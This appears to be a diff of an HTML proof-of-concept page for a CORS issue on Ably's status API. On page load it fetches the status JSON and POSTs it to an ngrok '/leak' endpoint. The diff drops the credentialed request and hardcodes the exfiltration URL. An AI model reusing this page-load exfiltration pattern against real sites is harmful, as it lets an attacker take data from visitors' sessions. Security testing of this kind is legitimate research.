@@ -17,21 +17,20 @@
       color: #0f0;
       border: 1px solid #0f0;
       padding: 10px;
+      resize: none;
     }
   </style>
 </head>
 <body>
   <h1>🚨 Ably Status CORS PoC</h1>
-  <p>Fetching from <code>https://status.ably.com/api/v2/status.json</code> with credentials...</p>
+  <p>Fetching from <code>https://status.ably.com/api/v2/status.json</code> without credentials...</p>
   <textarea id="output">Loading...</textarea>
 
   <script>
-    const NGROK_URL = "https://812c-152-58-177-169.ngrok-free.app";  // <-- Replace this with your current ngrok URL
-
     window.onload = () => {
       fetch("https://status.ably.com/api/v2/status.json", {
-        method: "GET",
-        credentials: "include"
+        method: "GET"
+        // credentials: "include"  <-- Removed to avoid CORS credential error
       })
       .then(res => res.text())
       .then(data => {
@@ -39,10 +38,13 @@
         document.getElementById("output").value = data;
 
         // Exfiltrate the data to your ngrok server
-        fetch(`${NGROK_URL}/leak`, {
+        fetch("https://812c-152-58-177-169.ngrok-free.app/leak", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ leaked: data })
+        })
+        .catch(err => {
+          console.error("Error exfiltrating data:", err);
         });
       })
       .catch(err => {
@@ -53,3 +55,4 @@
   </script>
 </body>
 </html>
+
